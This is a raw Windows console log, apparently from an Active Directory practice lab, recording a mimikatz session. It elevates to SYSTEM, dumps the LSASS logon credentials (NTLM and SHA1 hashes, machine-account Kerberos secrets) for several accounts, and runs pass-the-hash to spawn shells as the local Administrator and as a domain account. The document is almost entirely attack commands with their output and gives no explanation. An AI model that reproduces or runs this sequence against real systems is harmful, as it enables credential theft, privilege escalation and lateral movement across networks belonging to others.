Microsoft Windows [Version 10.0.19045.3930]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>title Admin prompt potato

C:\Windows\system32>color 1a

C:\Windows\system32>color 0a

C:\Windows\system32>color 03

C:\Windows\system32>color 02

C:\Windows\system32>color 05

C:\Windows\system32>color 04

C:\Windows\system32>dir C:\Users\normaluser\Downloads\mimikatz_trunk\x64
 Volume in drive C has no label.
 Volume Serial Number is 4648-179D

 Directory of C:\Users\normaluser\Downloads\mimikatz_trunk\x64

02/04/2024  08:54    <DIR>          .
02/04/2024  08:54    <DIR>          ..
02/04/2024  08:54            37.208 mimidrv.sys
02/04/2024  08:54         1.355.264 mimikatz.exe
02/04/2024  08:54            37.376 mimilib.dll
02/04/2024  08:54            10.752 mimispool.dll
               4 File(s)      1.440.600 bytes
               2 Dir(s)  22.003.892.224 bytes free

C:\Windows\system32>cd C:\Users\normaluser\Downloads\mimikatz_trunk\x64

C:\Users\normaluser\Downloads\mimikatz_trunk\x64>mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privillege::debug
ERROR mimikatz_doLocal ; "privillege" module not found !

        standard  -  Standard module  [Basic commands (does not require module name)]
          crypto  -  Crypto Module
        sekurlsa  -  SekurLSA module  [Some commands to enumerate credentials...]
        kerberos  -  Kerberos package module  []
             ngc  -  Next Generation Cryptography module (kiwi use only)  [Some commands to enumerate credentials...]
       privilege  -  Privilege module
         process  -  Process module
         service  -  Service module
         lsadump  -  LsaDump module
              ts  -  Terminal Server module
           event  -  Event module
            misc  -  Miscellaneous module
           token  -  Token manipulation module
           vault  -  Windows Vault/Credential module
     minesweeper  -  MineSweeper module
             net  -
           dpapi  -  DPAPI Module (by API or RAW access)  [Data Protection application programming interface]
       busylight  -  BusyLight Module
          sysenv  -  System Environment Value module
             sid  -  Security Identifiers module
             iis  -  IIS XML Config module
             rpc  -  RPC control of mimikatz
            sr98  -  RF module for SR98 device and T5577 target
             rdm  -  RF module for RDM(830 AL) device
             acr  -  ACR Module

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # token::elevate
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM

604     {0;000003e7} 1 D 24672          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
 -> Impersonated !
 * Process Token : {0;00334591} 1 F 3654296     WIN10CLIENT\potato      S-1-5-21-3704816349-2630934885-840893638-1006   (14g,24p)       Primary
 * Thread Token  : {0;000003e7} 1 D 3718873     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)

mimikatz #
^C
C:\Users\normaluser\Downloads\mimikatz_trunk\x64>sc start adminasst

SERVICE_NAME: adminasst
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
        PID                : 6432
        FLAGS              :

C:\Users\normaluser\Downloads\mimikatz_trunk\x64>sc start adminasst
[SC] StartService FAILED 1056:

An instance of the service is already running.


C:\Users\normaluser\Downloads\mimikatz_trunk\x64>mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 3739079 (00000000:00390dc7)
Session           : Service from 0
User Name         : Administrator
Domain            : WIN10CLIENT
Logon Server      : WIN10CLIENT
Logon Time        : 02/04/2024 08:57:00
SID               : S-1-5-21-3704816349-2630934885-840893638-500
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : WIN10CLIENT
         * NTLM     : af992895db0f2c42a1bc96546e92804a
         * SHA1     : 7373cb4b084c33a039ccc99aa33b0f4775c32298
         * DPAPI    : 7373cb4b084c33a039ccc99aa33b0f47
        tspkg :
        wdigest :
         * Username : Administrator
         * Domain   : WIN10CLIENT
         * Password : (null)
        kerberos :
         * Username : Administrator
         * Domain   : WIN10CLIENT
         * Password : (null)
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 3360145 (00000000:00334591)
Session           : Interactive from 1
User Name         : potato
Domain            : WIN10CLIENT
Logon Server      : WIN10CLIENT
Logon Time        : 02/04/2024 08:54:41
SID               : S-1-5-21-3704816349-2630934885-840893638-1006
        msv :
         [00000003] Primary
         * Username : potato
         * Domain   : WIN10CLIENT
         * NTLM     : d9ff985d1177011e8f1507bba25b1c3c
         * SHA1     : 0a19919469e6455c904c56c2dce1869ad6be2cc4
         * DPAPI    : 0a19919469e6455c904c56c2dce1869a
        tspkg :
        wdigest :
         * Username : potato
         * Domain   : WIN10CLIENT
         * Password : (null)
        kerberos :
         * Username : potato
         * Domain   : WIN10CLIENT
         * Password : (null)
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 371701 (00000000:0005abf5)
Session           : Interactive from 1
User Name         : normaluser
Domain            : ADLAB
Logon Server      : WIN2019DC
Logon Time        : 02/04/2024 08:45:03
SID               : S-1-5-21-2477219160-184884731-442278832-1110
        msv :
         [00000003] Primary
         * Username : normaluser
         * Domain   : ADLAB
         * NTLM     : d9ff985d1177011e8f1507bba25b1c3c
         * SHA1     : 0a19919469e6455c904c56c2dce1869ad6be2cc4
         * DPAPI    : d4e15f0129f1017783ca69c02a0edc0b
        tspkg :
        wdigest :
         * Username : normaluser
         * Domain   : ADLAB
         * Password : (null)
        kerberos :
         * Username : normaluser
         * Domain   : ADLAB.LOCAL
         * Password : (null)
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 02/04/2024 08:44:12
SID               : S-1-5-19
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 51805 (00000000:0000ca5d)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 02/04/2024 08:44:12
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : WIN10CLIENT$
         * Domain   : ADLAB
         * NTLM     : 0c5c67334ce15a777dab983c3e110732
         * SHA1     : 3c0be0cf2421a6142ddb03ec9c65eb6169a42ab1
         * DPAPI    : 3c0be0cf2421a6142ddb03ec9c65eb61
        tspkg :
        wdigest :
         * Username : WIN10CLIENT$
         * Domain   : ADLAB
         * Password : (null)
        kerberos :
         * Username : WIN10CLIENT$
         * Domain   : ADLAB.local
         * Password : 01 21 f5 3e 87 73 77 b7 0b 8b c8 8f 57 c3 b7 35 1b cc 06 ef 1a bc 96 b6 f4 b8 eb 0c 55 f9 6c cf 88 9f f7 36 26 09 52 78 14 82 16 79 dd 1d 83 30 54 7d a6 a0 02 ac bc 76 77 27 b2 96 4e 5b a6 3b 37 ea 69 27 7d 81 6c 15 d9 00 cd 7b b4 59 72 02 bb ac fb 9d 36 e1 cf 45 d5 3d bf 3e 1d ec 2d 6e 27 17 92 eb 95 58 56 dd 0f b7 e9 d0 e4 71 20 7c 9b 87 1c 07 7c 30 2e 1a 3e 3c eb 8f f7 f6 cc bc 3f 61 51 b2 10 48 3f f2 e1 92 e1 49 2d 77 f8 50 7a 3a 9f da 29 50 12 06 f3 b9 90 9e 59 60 8f e8 a2 0f f5 0e 3d e4 a7 08 3c 91 eb 07 b7 c3 ad bc ac 77 60 b7 a3 95 cc 9f 0d 74 68 57 f2 7b 19 87 1c f6 8d 4c 90 34 c0 06 3a d2 a6 76 eb 5a 65 58 d1 67 d4 33 b0 5c 39 93 5a 5c 5c d1 fb 04 e9 94 0b 0e 7a 77 10 00 bf ff 78 83 9b 5f 51 e8 a6 af
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 51770 (00000000:0000ca3a)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 02/04/2024 08:44:12
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : WIN10CLIENT$
         * Domain   : ADLAB
         * NTLM     : 1f7934e9666a840db9a5847ec5b83eea
         * SHA1     : d2c84ba7b145a7677312d8a9388b4d2549d251f5
         * DPAPI    : d2c84ba7b145a7677312d8a9388b4d25
        tspkg :
        wdigest :
         * Username : WIN10CLIENT$
         * Domain   : ADLAB
         * Password : (null)
        kerberos :
         * Username : WIN10CLIENT$
         * Domain   : ADLAB.local
         * Password : 61 e4 fc eb e5 bc 07 5a f4 3b ad 8b f6 25 57 54 cf a3 3a 08 a0 29 95 41 29 be 18 06 77 21 fd 7a 48 ce 88 5d 3b be 65 16 21 01 c6 02 9c 39 4b aa 4d fd 44 6f 3d 27 06 e3 86 d5 e8 d1 84 fa 42 db 82 74 7b 69 16 65 76 27 72 a9 40 7b 11 59 dc 4f 46 bb 10 f9 10 c0 0f bd bf fb 86 e1 ab 41 43 eb 99 89 a2 29 a5 98 35 eb 77 6a d0 00 83 f6 74 4c e4 fa 41 1d 28 fb 14 a8 13 90 a6 c8 1b 97 d7 3e 64 c5 7d 8c 63 cd 3f f9 d1 ac 2d 70 ce c2 a6 83 46 90 f4 da af d1 b5 21 3d 32 7a 78 06 be a5 d1 53 43 db 20 1e c0 9d 39 d7 c6 02 4d 15 03 46 58 11 5e 57 50 d1 59 a1 fa 6a 49 2e 16 f7 7d ac 4e 9a 0d f3 25 8f f2 e8 07 ae 1f 24 91 bc 6c c3 17 ac 43 1e 02 18 ca 0d a7 d6 3c 34 90 23 89 b1 98 2e d3 2b 91 42 76 65 b0 85 0d d7 e1 e7 3d 7a 39
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : WIN10CLIENT$
Domain            : ADLAB
Logon Server      : (null)
Logon Time        : 02/04/2024 08:44:12
SID               : S-1-5-20
        msv :
         [00000003] Primary
         * Username : WIN10CLIENT$
         * Domain   : ADLAB
         * NTLM     : 1f7934e9666a840db9a5847ec5b83eea
         * SHA1     : d2c84ba7b145a7677312d8a9388b4d2549d251f5
         * DPAPI    : d2c84ba7b145a7677312d8a9388b4d25
        tspkg :
        wdigest :
         * Username : WIN10CLIENT$
         * Domain   : ADLAB
         * Password : (null)
        kerberos :
         * Username : win10client$
         * Domain   : ADLAB.LOCAL
         * Password : 61 e4 fc eb e5 bc 07 5a f4 3b ad 8b f6 25 57 54 cf a3 3a 08 a0 29 95 41 29 be 18 06 77 21 fd 7a 48 ce 88 5d 3b be 65 16 21 01 c6 02 9c 39 4b aa 4d fd 44 6f 3d 27 06 e3 86 d5 e8 d1 84 fa 42 db 82 74 7b 69 16 65 76 27 72 a9 40 7b 11 59 dc 4f 46 bb 10 f9 10 c0 0f bd bf fb 86 e1 ab 41 43 eb 99 89 a2 29 a5 98 35 eb 77 6a d0 00 83 f6 74 4c e4 fa 41 1d 28 fb 14 a8 13 90 a6 c8 1b 97 d7 3e 64 c5 7d 8c 63 cd 3f f9 d1 ac 2d 70 ce c2 a6 83 46 90 f4 da af d1 b5 21 3d 32 7a 78 06 be a5 d1 53 43 db 20 1e c0 9d 39 d7 c6 02 4d 15 03 46 58 11 5e 57 50 d1 59 a1 fa 6a 49 2e 16 f7 7d ac 4e 9a 0d f3 25 8f f2 e8 07 ae 1f 24 91 bc 6c c3 17 ac 43 1e 02 18 ca 0d a7 d6 3c 34 90 23 89 b1 98 2e d3 2b 91 42 76 65 b0 85 0d d7 e1 e7 3d 7a 39
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 30554 (00000000:0000775a)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 02/04/2024 08:44:12
SID               : S-1-5-96-0-0
        msv :
         [00000003] Primary
         * Username : WIN10CLIENT$
         * Domain   : ADLAB
         * NTLM     : 1f7934e9666a840db9a5847ec5b83eea
         * SHA1     : d2c84ba7b145a7677312d8a9388b4d2549d251f5
         * DPAPI    : d2c84ba7b145a7677312d8a9388b4d25
        tspkg :
        wdigest :
         * Username : WIN10CLIENT$
         * Domain   : ADLAB
         * Password : (null)
        kerberos :
         * Username : WIN10CLIENT$
         * Domain   : ADLAB.local
         * Password : 61 e4 fc eb e5 bc 07 5a f4 3b ad 8b f6 25 57 54 cf a3 3a 08 a0 29 95 41 29 be 18 06 77 21 fd 7a 48 ce 88 5d 3b be 65 16 21 01 c6 02 9c 39 4b aa 4d fd 44 6f 3d 27 06 e3 86 d5 e8 d1 84 fa 42 db 82 74 7b 69 16 65 76 27 72 a9 40 7b 11 59 dc 4f 46 bb 10 f9 10 c0 0f bd bf fb 86 e1 ab 41 43 eb 99 89 a2 29 a5 98 35 eb 77 6a d0 00 83 f6 74 4c e4 fa 41 1d 28 fb 14 a8 13 90 a6 c8 1b 97 d7 3e 64 c5 7d 8c 63 cd 3f f9 d1 ac 2d 70 ce c2 a6 83 46 90 f4 da af d1 b5 21 3d 32 7a 78 06 be a5 d1 53 43 db 20 1e c0 9d 39 d7 c6 02 4d 15 03 46 58 11 5e 57 50 d1 59 a1 fa 6a 49 2e 16 f7 7d ac 4e 9a 0d f3 25 8f f2 e8 07 ae 1f 24 91 bc 6c c3 17 ac 43 1e 02 18 ca 0d a7 d6 3c 34 90 23 89 b1 98 2e d3 2b 91 42 76 65 b0 85 0d d7 e1 e7 3d 7a 39
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 30457 (00000000:000076f9)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 02/04/2024 08:44:12
SID               : S-1-5-96-0-1
        msv :
         [00000003] Primary
         * Username : WIN10CLIENT$
         * Domain   : ADLAB
         * NTLM     : 1f7934e9666a840db9a5847ec5b83eea
         * SHA1     : d2c84ba7b145a7677312d8a9388b4d2549d251f5
         * DPAPI    : d2c84ba7b145a7677312d8a9388b4d25
        tspkg :
        wdigest :
         * Username : WIN10CLIENT$
         * Domain   : ADLAB
         * Password : (null)
        kerberos :
         * Username : WIN10CLIENT$
         * Domain   : ADLAB.local
         * Password : 61 e4 fc eb e5 bc 07 5a f4 3b ad 8b f6 25 57 54 cf a3 3a 08 a0 29 95 41 29 be 18 06 77 21 fd 7a 48 ce 88 5d 3b be 65 16 21 01 c6 02 9c 39 4b aa 4d fd 44 6f 3d 27 06 e3 86 d5 e8 d1 84 fa 42 db 82 74 7b 69 16 65 76 27 72 a9 40 7b 11 59 dc 4f 46 bb 10 f9 10 c0 0f bd bf fb 86 e1 ab 41 43 eb 99 89 a2 29 a5 98 35 eb 77 6a d0 00 83 f6 74 4c e4 fa 41 1d 28 fb 14 a8 13 90 a6 c8 1b 97 d7 3e 64 c5 7d 8c 63 cd 3f f9 d1 ac 2d 70 ce c2 a6 83 46 90 f4 da af d1 b5 21 3d 32 7a 78 06 be a5 d1 53 43 db 20 1e c0 9d 39 d7 c6 02 4d 15 03 46 58 11 5e 57 50 d1 59 a1 fa 6a 49 2e 16 f7 7d ac 4e 9a 0d f3 25 8f f2 e8 07 ae 1f 24 91 bc 6c c3 17 ac 43 1e 02 18 ca 0d a7 d6 3c 34 90 23 89 b1 98 2e d3 2b 91 42 76 65 b0 85 0d d7 e1 e7 3d 7a 39
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 29144 (00000000:000071d8)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 02/04/2024 08:44:12
SID               :
        msv :
         [00000003] Primary
         * Username : WIN10CLIENT$
         * Domain   : ADLAB
         * NTLM     : 1f7934e9666a840db9a5847ec5b83eea
         * SHA1     : d2c84ba7b145a7677312d8a9388b4d2549d251f5
         * DPAPI    : d2c84ba7b145a7677312d8a9388b4d25
        tspkg :
        wdigest :
        kerberos :
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : WIN10CLIENT$
Domain            : ADLAB
Logon Server      : (null)
Logon Time        : 02/04/2024 08:44:12
SID               : S-1-5-18
        msv :
        tspkg :
        wdigest :
         * Username : WIN10CLIENT$
         * Domain   : ADLAB
         * Password : (null)
        kerberos :
         * Username : win10client$
         * Domain   : ADLAB.LOCAL
         * Password : 61 e4 fc eb e5 bc 07 5a f4 3b ad 8b f6 25 57 54 cf a3 3a 08 a0 29 95 41 29 be 18 06 77 21 fd 7a 48 ce 88 5d 3b be 65 16 21 01 c6 02 9c 39 4b aa 4d fd 44 6f 3d 27 06 e3 86 d5 e8 d1 84 fa 42 db 82 74 7b 69 16 65 76 27 72 a9 40 7b 11 59 dc 4f 46 bb 10 f9 10 c0 0f bd bf fb 86 e1 ab 41 43 eb 99 89 a2 29 a5 98 35 eb 77 6a d0 00 83 f6 74 4c e4 fa 41 1d 28 fb 14 a8 13 90 a6 c8 1b 97 d7 3e 64 c5 7d 8c 63 cd 3f f9 d1 ac 2d 70 ce c2 a6 83 46 90 f4 da af d1 b5 21 3d 32 7a 78 06 be a5 d1 53 43 db 20 1e c0 9d 39 d7 c6 02 4d 15 03 46 58 11 5e 57 50 d1 59 a1 fa 6a 49 2e 16 f7 7d ac 4e 9a 0d f3 25 8f f2 e8 07 ae 1f 24 91 bc 6c c3 17 ac 43 1e 02 18 ca 0d a7 d6 3c 34 90 23 89 b1 98 2e d3 2b 91 42 76 65 b0 85 0d d7 e1 e7 3d 7a 39
        ssp :
        credman :
        cloudap :

mimikatz # sekurlsa::pth /user:Administrator /domain:WIN10CLIENT /ntlm:af992895db0f2c42a1bc96546e92804a /run:"cmd"
user    : Administrator
domain  : WIN10CLIENT
program : cmd
impers. : no
NTLM    : af992895db0f2c42a1bc96546e92804a
  |  PID  7436
  |  TID  6412
  |  LSA Process is now R/W
  |  LUID 0 ; 4288507 (00000000:00416ffb)
  \_ msv1_0   - data copy @ 000002103716B260 : OK !
  \_ kerberos -

mimikatz # sekurlsa::pth /user:domad /domain:ADLAB /ntlm:cff48581d56085119bddffacfae51aeb /run:"cmd"
user    : domad
domain  : ADLAB
program : cmd
impers. : no
NTLM    : cff48581d56085119bddffacfae51aeb
  |  PID  2600
  |  TID  1420
  |  LSA Process was already R/W
  |  LUID 0 ; 6448738 (00000000:00626662)
  \_ msv1_0   - data copy @ 00000210370F1410 : OK !
  \_ kerberos - data copy @ 0000021037342068
   \_ des_cbc_md4       -> null
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ *Password replace @ 0000021036883198 (32) -> null

mimikatz #